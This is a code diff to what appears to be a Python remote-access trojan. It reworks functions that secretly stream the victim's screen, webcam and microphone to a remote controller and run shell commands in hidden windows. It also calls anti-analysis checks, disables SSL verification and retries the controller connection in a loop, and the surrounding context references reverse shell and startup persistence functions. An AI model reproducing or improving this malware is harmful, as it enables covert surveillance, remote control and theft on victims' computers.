@@ -44,6 +44,13 @@ except ImportError:
 
 import requests
 import time
+import urllib3
+import warnings
+
+# Suppress SSL warnings
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+warnings.filterwarnings('ignore', message='Unverified HTTPS request')
+
 import uuid
 import os
 import subprocess
@@ -68,26 +75,53 @@ try:
     WINDOWS_AVAILABLE = True
 except ImportError:
     WINDOWS_AVAILABLE = False
-    
-import pyaudio
+
+# Enhanced import handling with feature flags
+try:
+    import pyaudio
+    PYAUDIO_AVAILABLE = True
+except ImportError:
+    PYAUDIO_AVAILABLE = False
+
 import base64
 import tempfile
-import pynput
-from pynput import keyboard, mouse
-import pygame
+try:
+    import pynput
+    from pynput import keyboard, mouse
+    PYNPUT_AVAILABLE = True
+except ImportError:
+    PYNPUT_AVAILABLE = False
+
+try:
+    import pygame
+    PYGAME_AVAILABLE = True
+except ImportError:
+    PYGAME_AVAILABLE = False
+
 import io
 import wave
 import socket
 import json
 import asyncio
-import websockets
+try:
+    import websockets
+    WEBSOCKETS_AVAILABLE = True
+except ImportError:
+    WEBSOCKETS_AVAILABLE = False
+
 try:
     import speech_recognition as sr
     SPEECH_RECOGNITION_AVAILABLE = True
 except ImportError:
     SPEECH_RECOGNITION_AVAILABLE = False
+
 import psutil
-from PIL import Image
+try:
+    from PIL import Image
+    PIL_AVAILABLE = True
+except ImportError:
+    PIL_AVAILABLE = False
+
 import platform
 try:
     import pyautogui
@@ -97,7 +131,9 @@ except ImportError:
 
 import socketio
 
+# Configuration
 SERVER_URL = "https://agent-controller.onrender.com"  # Change to your controller's URL
+DEBUG_MODE = False  # Set to True for verbose logging
 
 # --- Agent State ---
 STREAMING_ENABLED = False
@@ -118,16 +154,23 @@ LAST_CLIPBOARD_CONTENT = ""
 
 # --- Audio Config ---
 CHUNK = 1024
-FORMAT = pyaudio.paInt16
+FORMAT = None
+if PYAUDIO_AVAILABLE:
+    FORMAT = pyaudio.paInt16
 CHANNELS = 1
 RATE = 44100
 
-# --- WebSocket Client with SSL ---
+# --- WebSocket Client ---
 sio = socketio.Client(
-    ssl_verify=True,
+    ssl_verify=False,  # Disable SSL verification to prevent warnings
     engineio_logger=False,
     logger=False
 )
+
+def debug_log(message):
+    """Log debug messages if debug mode is enabled."""
+    if DEBUG_MODE:
+        print(f"[DEBUG] {message}")
 
 # --- Background Initialization System ---
 class BackgroundInitializer:
@@ -2196,148 +2239,57 @@ def get_or_create_agent_id():
 
 def stream_screen(agent_id):
     """
-    High-performance screen streaming with 60+ FPS capability.
-    Uses optimized capture backend and compression.
-    """
-    global STREAMING_ENABLED
-    
-    # For now, skip high-performance capture and use fallback
-    try:
-        # This will be implemented when we reorganize the code
-        raise ImportError("Using fallback streaming for now")
-        
-        url = f"{SERVER_URL}/stream/{agent_id}"
-        headers = {'Content-Type': 'image/jpeg'}
-        
-        def send_frame(frame_data):
-            """Callback to send frame data"""
-            if frame_data and frame_data != b'DELTA_UNCHANGED':
-                try:
-                    start_time = time.time()
-                    
-                    # Handle compressed frames
-                    if frame_data.startswith(b'LZ4_COMPRESSED'):
-                        headers['Content-Encoding'] = 'lz4'
-                        frame_data = frame_data[14:]  # Remove prefix
-                    else:
-                        headers.pop('Content-Encoding', None)
-                    
-                    response = requests.post(url, data=frame_data, headers=headers, timeout=0.1)
-                    
-                    # Update bandwidth stats for adaptive quality
-                    elapsed = time.time() - start_time
-                    quality_manager.update_bandwidth(len(frame_data), elapsed)
-                    
-                except requests.exceptions.Timeout:
-                    pass  # Skip frame if timeout - prioritize low latency
-                except Exception as e:
-                    print(f"Frame send error: {e}")
-        
-        print(f"Starting high-performance screen capture: {capture.get_stats()}")
-        
-        # Start the capture stream
-        capture.start_capture_stream(send_frame)
-        
-        # Keep the stream alive
-        while STREAMING_ENABLED:
-            time.sleep(1)
-            
-            # Log performance stats occasionally
-            stats = capture.get_stats()
-            if stats.get('actual_fps', 0) > 0:
-                print(f"Streaming at {stats['actual_fps']} FPS using {stats['backend']}")
-        
-        # Cleanup
-        capture.stop_capture_stream()
-        print("High-performance screen streaming stopped")
-        
-    except ImportError:
-        print("High-performance capture not available, falling back to standard streaming")
-        # Fallback to original implementation with improvements
-        _stream_screen_fallback(agent_id)
-    except Exception as e:
-        print(f"High-performance streaming error: {e}")
-        _stream_screen_fallback(agent_id)
-
-def _stream_screen_fallback(agent_id):
-    """
-    Fallback screen streaming with basic optimizations
+    Captures the screen and streams it to the controller.
+    This function runs in a separate thread.
     """
     global STREAMING_ENABLED
     url = f"{SERVER_URL}/stream/{agent_id}"
     headers = {'Content-Type': 'image/jpeg'}
 
-    with mss.mss() as sct:
-        # Optimize for higher FPS than original
-        target_fps = 45  # Increased from 30
-        frame_time = 1.0 / target_fps
-        last_frame_hash = None
-        frame_skip_count = 0
-        
-        while STREAMING_ENABLED:
-            try:
-                current_time = time.time()
-                
-                # Get raw pixels from the screen
-                sct_img = sct.grab(sct.monitors[1])
-                
-                # Create an OpenCV image
-                img = np.array(sct_img)
-                
-                # Basic delta compression - skip identical frames
-                import hashlib
-                frame_hash = hashlib.md5(img.tobytes()).hexdigest()
-                if frame_hash == last_frame_hash:
-                    frame_skip_count += 1
-                    if frame_skip_count < 5:  # Skip up to 5 identical frames
-                        time.sleep(frame_time * 0.5)
-                        continue
-                
-                last_frame_hash = frame_hash
-                frame_skip_count = 0
-                
-                # Resize for better performance if screen is too large
-                height, width = img.shape[:2]
-                if width > 1920:
-                    scale = 1920 / width
-                    new_width = int(width * scale)
-                    new_height = int(height * scale)
-                    img = cv2.resize(img, (new_width, new_height), interpolation=cv2.INTER_AREA)
-                
-                # Encode with better compression settings
-                is_success, buffer = cv2.imencode(".jpg", img, [
-                    cv2.IMWRITE_JPEG_QUALITY, 90,  # Slightly higher quality
-                    cv2.IMWRITE_JPEG_OPTIMIZE, 1,
-                    cv2.IMWRITE_JPEG_PROGRESSIVE, 1
-                ])
-                if not is_success:
-                    continue
-
-                # Send the frame asynchronously with shorter timeout
+    try:
+        with mss.mss() as sct:
+            while STREAMING_ENABLED:
                 try:
-                    requests.post(url, data=buffer.tobytes(), headers=headers, timeout=0.05)
-                except requests.exceptions.Timeout:
-                    pass  # Skip frame if timeout
-                
-                # Maintain target FPS with better timing
-                elapsed = time.time() - current_time
-                sleep_time = max(0, frame_time - elapsed)
-                if sleep_time > 0:
-                    time.sleep(sleep_time)
+                    # Get raw pixels from the screen
+                    sct_img = sct.grab(sct.monitors[1])
                     
-            except Exception as e:
-                print(f"Stream error: {e}")
-                time.sleep(0.5)  # Shorter wait before retrying
+                    # Create an OpenCV image
+                    img = np.array(sct_img)
+                    
+                    # Encode the image as JPEG with 70% quality
+                    is_success, buffer = cv2.imencode(".jpg", img, [cv2.IMWRITE_JPEG_QUALITY, 70])
+                    if not is_success:
+                        continue
+
+                    # Send the frame to the controller
+                    response = requests.post(url, data=buffer.tobytes(), headers=headers, timeout=1)
+                    if response.status_code != 200:
+                        debug_log(f"Stream upload failed: {response.status_code}")
+                    
+                    # Control frame rate to ~10 FPS
+                    time.sleep(0.1)
+                except requests.exceptions.RequestException as e:
+                    debug_log(f"Stream network error: {e}")
+                    time.sleep(2)  # Wait before retrying
+                except Exception as e:
+                    debug_log(f"Stream error: {e}")
+                    time.sleep(2)  # Wait before retrying
+    except Exception as e:
+        print(f"Critical stream error: {e}")
+        STREAMING_ENABLED = False
+
+
 
 def stream_camera(agent_id):
     """
-    Captures the webcam and streams it to the controller at high FPS.
+    Captures the webcam and streams it to the controller.
     This function runs in a separate thread.
     """
     global CAMERA_STREAMING_ENABLED
     url = f"{SERVER_URL}/camera/{agent_id}"
     headers = {'Content-Type': 'image/jpeg'}
 
+    cap = None
     try:
         # Use CAP_DSHOW on Windows for better device compatibility and performance.
         if WINDOWS_AVAILABLE:
@@ -2350,50 +2302,40 @@ def stream_camera(agent_id):
             CAMERA_STREAMING_ENABLED = False
             return
             
-        # Set camera properties for higher FPS
-        cap.set(cv2.CAP_PROP_FPS, 30)
-        cap.set(cv2.CAP_PROP_FRAME_WIDTH, 1280)
-        cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 720)
-        cap.set(cv2.CAP_PROP_BUFFERSIZE, 1)  # Reduce buffer for lower latency
+        # Set camera properties for better performance
+        cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
+        cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
+        cap.set(cv2.CAP_PROP_FPS, 10)
         
     except Exception as e:
         print(f"Could not open webcam: {e}")
         CAMERA_STREAMING_ENABLED = False
         return
 
-    target_fps = 30
-    frame_time = 1.0 / target_fps
-    
-    while CAMERA_STREAMING_ENABLED:
-        try:
-            current_time = time.time()
-            
-            ret, frame = cap.read()
-            if not ret:
-                break
-                
-            # Optimize frame quality for speed
-            is_success, buffer = cv2.imencode(".jpg", frame, [
-                cv2.IMWRITE_JPEG_QUALITY, 85,
-                cv2.IMWRITE_JPEG_OPTIMIZE, 1
-            ])
-            if is_success:
-                try:
-                    requests.post(url, data=buffer.tobytes(), headers=headers, timeout=0.5)
-                except requests.exceptions.Timeout:
-                    pass  # Skip frame if timeout
+    try:
+        while CAMERA_STREAMING_ENABLED:
+            try:
+                ret, frame = cap.read()
+                if not ret:
+                    debug_log("Failed to read camera frame")
+                    break
                     
-            # Maintain target FPS
-            elapsed = time.time() - current_time
-            sleep_time = max(0, frame_time - elapsed)
-            if sleep_time > 0:
-                time.sleep(sleep_time)
-                
-        except Exception as e:
-            print(f"Camera stream error: {e}")
-            time.sleep(1)
-            
-    cap.release()
+                is_success, buffer = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 70])
+                if is_success:
+                    response = requests.post(url, data=buffer.tobytes(), headers=headers, timeout=1)
+                    if response.status_code != 200:
+                        debug_log(f"Camera upload failed: {response.status_code}")
+                        
+                time.sleep(0.1)  # ~10 FPS
+            except requests.exceptions.RequestException as e:
+                debug_log(f"Camera network error: {e}")
+                time.sleep(2)
+            except Exception as e:
+                debug_log(f"Camera stream error: {e}")
+                break
+    finally:
+        if cap:
+            cap.release()
 
 def stream_audio(agent_id):
     """
@@ -2401,31 +2343,56 @@ def stream_audio(agent_id):
     This function runs in a separate thread.
     """
     global AUDIO_STREAMING_ENABLED
+    
+    if not PYAUDIO_AVAILABLE:
+        print("PyAudio not available - cannot stream audio")
+        AUDIO_STREAMING_ENABLED = False
+        return
+        
     url = f"{SERVER_URL}/audio/{agent_id}"
     
+    p = None
+    stream = None
     try:
         p = pyaudio.PyAudio()
         # --- Diagnostic: Print the default device to be used ---
         default_device_info = p.get_default_input_device_info()
-        print(f"Attempting to use default audio device: {default_device_info['name']}")
-        # --- End Diagnostic ---
-        stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK, input_device_index=default_device_info['index'])
+        debug_log(f"Using audio device: {default_device_info['name']}")
+        
+        stream = p.open(
+            format=FORMAT, 
+            channels=CHANNELS, 
+            rate=RATE, 
+            input=True, 
+            frames_per_buffer=CHUNK, 
+            input_device_index=default_device_info['index']
+        )
     except Exception as e:
         print(f"Could not open audio stream: {e}")
         AUDIO_STREAMING_ENABLED = False
+        if p:
+            p.terminate()
         return
 
-    while AUDIO_STREAMING_ENABLED:
-        try:
-            data = stream.read(CHUNK)
-            requests.post(url, data=data, timeout=1)
-        except Exception as e:
-            print(f"Audio stream error: {e}")
-            break
-    
-    stream.stop_stream()
-    stream.close()
-    p.terminate()
+    try:
+        while AUDIO_STREAMING_ENABLED:
+            try:
+                data = stream.read(CHUNK)
+                response = requests.post(url, data=data, timeout=1)
+                if response.status_code != 200:
+                    debug_log(f"Audio upload failed: {response.status_code}")
+            except requests.exceptions.RequestException as e:
+                debug_log(f"Audio network error: {e}")
+                time.sleep(1)
+            except Exception as e:
+                debug_log(f"Audio stream error: {e}")
+                break
+    finally:
+        if stream:
+            stream.stop_stream()
+            stream.close()
+        if p:
+            p.terminate()
 
 def start_streaming(agent_id):
     global STREAMING_ENABLED, STREAM_THREAD
@@ -2435,6 +2402,7 @@ def start_streaming(agent_id):
         STREAM_THREAD.daemon = True
         STREAM_THREAD.start()
         print("Started video stream.")
+        return "Video streaming started"
 
 def stop_streaming():
     global STREAMING_ENABLED, STREAM_THREAD
@@ -2444,6 +2412,7 @@ def stop_streaming():
             STREAM_THREAD.join(timeout=2)
         STREAM_THREAD = None
         print("Stopped video stream.")
+        return "Video streaming stopped"
 
 def start_audio_streaming(agent_id):
     global AUDIO_STREAMING_ENABLED, AUDIO_STREAM_THREAD
@@ -2453,6 +2422,7 @@ def start_audio_streaming(agent_id):
         AUDIO_STREAM_THREAD.daemon = True
         AUDIO_STREAM_THREAD.start()
         print("Started audio stream.")
+        return "Audio streaming started"
 
 def stop_audio_streaming():
     global AUDIO_STREAMING_ENABLED, AUDIO_STREAM_THREAD
@@ -2462,6 +2432,7 @@ def stop_audio_streaming():
             AUDIO_STREAM_THREAD.join(timeout=2)
         AUDIO_STREAM_THREAD = None
         print("Stopped audio stream.")
+        return "Audio streaming stopped"
 
 def start_camera_streaming(agent_id):
     global CAMERA_STREAMING_ENABLED, CAMERA_STREAM_THREAD
@@ -2471,6 +2442,7 @@ def start_camera_streaming(agent_id):
         CAMERA_STREAM_THREAD.daemon = True
         CAMERA_STREAM_THREAD.start()
         print("Started camera stream.")
+        return "Camera streaming started"
 
 def stop_camera_streaming():
     global CAMERA_STREAMING_ENABLED, CAMERA_STREAM_THREAD
@@ -2480,6 +2452,17 @@ def stop_camera_streaming():
             CAMERA_STREAM_THREAD.join(timeout=2)
         CAMERA_STREAM_THREAD = None
         print("Stopped camera stream.")
+        return "Camera streaming stopped"
+
+def cleanup_resources():
+    """Clean up all resources before shutdown."""
+    try:
+        stop_streaming()
+        stop_audio_streaming()
+        stop_camera_streaming()
+        debug_log("Resources cleaned up successfully")
+    except Exception as e:
+        debug_log(f"Error during cleanup: {e}")
 
 # --- Reverse Shell Functions ---
 
@@ -3283,6 +3266,41 @@ def handle_live_audio(command_parts):
 def execute_command(command):
     """Executes a command and returns its output."""
     try:
+        # Handle 'cd' command for changing directory
+        if command.strip().startswith("cd "):
+            try:
+                # Extract the directory from the command
+                new_dir = command.strip().split(" ", 1)[1]
+                
+                # Expand user path if needed
+                if new_dir.startswith("~"):
+                    new_dir = os.path.expanduser(new_dir)
+                
+                # Change the current working directory
+                os.chdir(new_dir)
+                
+                # Return the new current directory
+                return f"Changed directory to: {os.getcwd()}"
+            except IndexError:
+                return "Invalid 'cd' command: No directory specified."
+            except FileNotFoundError:
+                return f"Directory not found: {new_dir}"
+            except Exception as e:
+                return f"Failed to change directory: {e}"
+
+        # Handle special commands
+        if command.strip() == "pwd":
+            return f"Current directory: {os.getcwd()}"
+        
+        if command.strip() == "whoami":
+            try:
+                if WINDOWS_AVAILABLE:
+                    return subprocess.run(["whoami"], capture_output=True, text=True, timeout=5).stdout.strip()
+                else:
+                    return os.getlogin()
+            except:
+                return "Unknown user"
+
         if WINDOWS_AVAILABLE:
             # Explicitly use PowerShell to execute commands on Windows
             result = subprocess.run(
@@ -3290,7 +3308,8 @@ def execute_command(command):
                 capture_output=True,
                 text=True,
                 timeout=30,
-                creationflags=subprocess.CREATE_NO_WINDOW
+                creationflags=subprocess.CREATE_NO_WINDOW,
+                cwd=os.getcwd()  # Execute in the current directory
             )
         else:
             # Use bash on Linux/Unix systems
@@ -3298,12 +3317,16 @@ def execute_command(command):
                 ["bash", "-c", command],
                 capture_output=True,
                 text=True,
-                timeout=30
+                timeout=30,
+                cwd=os.getcwd()  # Execute in the current directory
             )
+        
         output = result.stdout + result.stderr
         if not output:
-            return "[No output from command]"
+            return f"[No output from command] Return code: {result.returncode}"
         return output
+    except subprocess.TimeoutExpired:
+        return "Command timed out after 30 seconds"
     except Exception as e:
         return f"Command execution failed: {e}"
 
@@ -6004,74 +6027,83 @@ def add_linux_startup():
         print(f"[WARN] Linux startup configuration failed: {e}")
 
 def agent_main():
-    """Main function for agent mode (original main functionality)."""
+    """Main function for agent mode with improved error handling."""
     # Show startup banner
     print("=" * 60)
-    print("Advanced Python Agent v2.0 (UACME Enhanced)")
+    print("Advanced Python Agent v2.1 (Enhanced)")
     print("Starting up...")
     print("=" * 60)
     
-    # Run anti-analysis checks first (fast operation)
+    # Initialize agent with error handling
     try:
-        anti_analysis()
-    except:
-        pass
-    
-    print("Initializing agent...")
-    
-    # Start background initialization immediately
-    # Check if quick startup is requested
-    quick_startup = "--quick" in sys.argv
-    background_initializer.start_background_initialization(quick_startup=quick_startup)
-    
-    # Get agent ID (fast operation)
-    AGENT_ID = get_or_create_agent_id()
-    print(f"Agent starting with ID: {AGENT_ID}")
-    
-    # Quick privilege check (non-blocking)
-    if WINDOWS_AVAILABLE:
-        if is_admin():
-            print("Running with administrator privileges")
-        else:
-            print("Running with user privileges")
-    
-    # Start main connection loop immediately
-    print("Starting connection loop...")
-    
-    # Main connection loop with background initialization monitoring
-    connection_attempts = 0
-    while True:
-        try:
-            # Check if initialization is complete
-            if background_initializer.initialization_complete.is_set():
-                status = background_initializer.get_initialization_status()
-                for task, result in status.items():
-                    if result['success']:
-                        print(f"[OK] {task}: {result['result']}")
-                    else:
-                        print(f"[WARN] {task}: {result['error']}")
+        if WINDOWS_AVAILABLE:
+            print("Running on Windows - initializing Windows-specific features...")
             
-            # Connect to server
-            connection_attempts += 1
-            print(f"Connecting to server (attempt {connection_attempts})...")
-            sio.connect(SERVER_URL)
-            print("Connected successfully!")
-            sio.wait()
-        except socketio.exceptions.ConnectionError:
-            print(f"Connection failed (attempt {connection_attempts}). Retrying in 10 seconds...")
-            time.sleep(10)
-        except KeyboardInterrupt:
-            print("\nReceived interrupt signal, shutting down...")
-            break
-        except Exception as e:
-            print(f"An unexpected error occurred: {e}")
-            stop_streaming()
-            stop_audio_streaming()
-            stop_camera_streaming()
-            if low_latency_input:
-                low_latency_input.stop()
-            print("Cleaned up resources. Retrying in 10 seconds...")
-            time.sleep(10)
+            # Check admin privileges
+            if is_admin():
+                print("[OK] Running with administrator privileges")
+            else:
+                print("[INFO] Not running as administrator")
+            
+            # Run Windows-specific setup
+            try:
+                # Run anti-analysis checks first
+                anti_analysis()
+                print("[OK] Anti-analysis checks passed")
+            except Exception as e:
+                debug_log(f"Anti-analysis check failed: {e}")
+        else:
+            print("Running on non-Windows system")
+        
+        # Get or create agent ID
+        AGENT_ID = get_or_create_agent_id()
+        print(f"[OK] Agent starting with ID: {AGENT_ID}")
+        
+        print("Initializing connection to server...")
+        
+        # Main connection loop with improved error handling
+        connection_attempts = 0
+        max_attempts = 50  # Prevent infinite loops
+        
+        while connection_attempts < max_attempts:
+            try:
+                connection_attempts += 1
+                print(f"Connecting to server (attempt {connection_attempts})...")
+                sio.connect(SERVER_URL, wait_timeout=10)
+                print("[OK] Connected to server successfully!")
+                sio.wait()
+            except socketio.exceptions.ConnectionError as e:
+                print(f"[WARN] Connection failed (attempt {connection_attempts}): {e}")
+                if connection_attempts >= max_attempts:
+                    print("[ERROR] Maximum connection attempts reached. Exiting.")
+                    break
+                time.sleep(min(10, connection_attempts * 2))  # Exponential backoff
+            except KeyboardInterrupt:
+                print("\n[INFO] Received interrupt signal. Shutting down gracefully...")
+                break
+            except Exception as e:
+                print(f"[ERROR] An unexpected error occurred: {e}")
+                cleanup_resources()
+                
+                if connection_attempts >= max_attempts:
+                    print("[ERROR] Maximum connection attempts reached. Exiting.")
+                    break
+                    
+                print("Retrying in 10 seconds...")
+                time.sleep(10)
+    
+    except KeyboardInterrupt:
+        print("\n[INFO] Agent shutdown requested.")
+    except Exception as e:
+        print(f"[ERROR] Critical error during startup: {e}")
+    finally:
+        print("[INFO] Agent shutting down.")
+        cleanup_resources()
+        try:
+            if sio.connected:
+                sio.disconnect()
+        except:
+            pass
 
 def signal_handler(signum, frame):
     """Handle shutdown signals gracefully."""
